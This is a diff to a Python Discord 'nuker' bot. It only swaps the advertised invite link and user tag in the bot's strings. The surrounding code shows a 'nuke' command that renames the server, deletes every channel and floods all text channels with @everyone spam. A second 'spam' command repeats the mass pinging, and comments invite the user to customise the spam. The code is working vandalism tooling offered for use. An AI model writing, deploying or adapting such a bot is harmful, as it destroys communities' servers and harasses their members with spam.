@@ -16,7 +16,7 @@ client = commands.Bot(command_prefix=prefix, intents=intents)
 @client.event
 async def on_ready():
     print('Bot is online')
-    await client.change_presence(activity=discord.Game('discord.gg/tro')) #YOU MAY CHANGE STATUS
+    await client.change_presence(activity=discord.Game('discord.gg/trends')) #YOU MAY CHANGE STATUS
 
 @client.command()
 async def ping(ctx):
@@ -29,7 +29,7 @@ async def invite(ctx):
 @client.command()
 async def nuke(ctx):
 
-    await ctx.guild.edit(name='two#8821 | discord.gg/tro') #YOU MAY CHANGE SERVER NAME
+    await ctx.guild.edit(name='two#8821 | discord.gg/trends') #YOU MAY CHANGE SERVER NAME
 
     for c in ctx.guild.channels:
         await c.delete()
@@ -42,19 +42,19 @@ async def nuke(ctx):
         n = n+1
 
     for c in ctx.guild.text_channels:
-             await c.send('@everyone two#8821 was here join discord.gg/tro') #YOU MAY CHANGE SPAMMING TEXT
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
+             await c.send('@everyone two#3082 was here join discord.gg/trends') #YOU MAY CHANGE SPAMMING TEXT
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
 
 @client.command()
 async def spam(ctx):
     for c in ctx.guild.text_channels:
-             await c.send('@everyone two#8821 was here join discord.gg/tro') #YOU MAY CHANGE SPAMMING TEXT
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
-             await c.send('@everyone two#8821 was here join discord.gg/tro')
+             await c.send('@everyone two#3082 was here join discord.gg/trends') #YOU MAY CHANGE SPAMMING TEXT
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
+             await c.send('@everyone two#3082 was here join discord.gg/trends')
 
 client.run('YOUR TOKEN HERE') #DISCORD TOKEN IN BETWEEN THE '
